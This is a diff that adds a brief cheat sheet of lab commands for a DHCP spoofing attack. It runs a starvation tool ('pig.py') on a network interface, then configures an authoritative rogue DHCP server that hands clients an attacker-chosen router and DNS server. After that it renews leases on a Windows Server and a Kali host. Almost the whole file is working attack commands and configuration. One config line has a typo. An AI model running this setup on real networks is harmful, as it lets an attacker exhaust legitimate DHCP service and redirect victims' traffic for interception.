@@ -1,0 +1,42 @@
+###PIG###
+
+sudo python3 pig.py -i eth0
+
+###DHCP spoofing###
+
+sudo nano /etc/default/isc-dhcp-server
+INTERFACESv4="eth0"
+
+###setup DHCP Server###
+sudo apt update
+sudo apt install isc-dhcp-server -y
+
+sudo nano /etc/dhcp/dhcpd.conf
+
+###config###
+
+ption domain-name "example.org";
+option domain-name-servers ns1.example.org, ns2.example.org;
+
+default-lease-time 600;
+max-lease-time 7200;
+authoritative;
+
+subnet 192.168.2.0 netmask 255.255.255.0 {
+    range 192.168.2.202 192.168.2.255;
+    option routers 192.168.2.52;                               
+    option domain-name-servers 192.168.2.52;                          
+}
+
+sudo systemctl restart isc-dhcp-server
+
+###WinServer###
+
+ipconfig/all
+ipconfig/release
+ipconfig/renew
+
+###kali###
+
+sudo dhclient -r    
+sudo dhclient eth0  
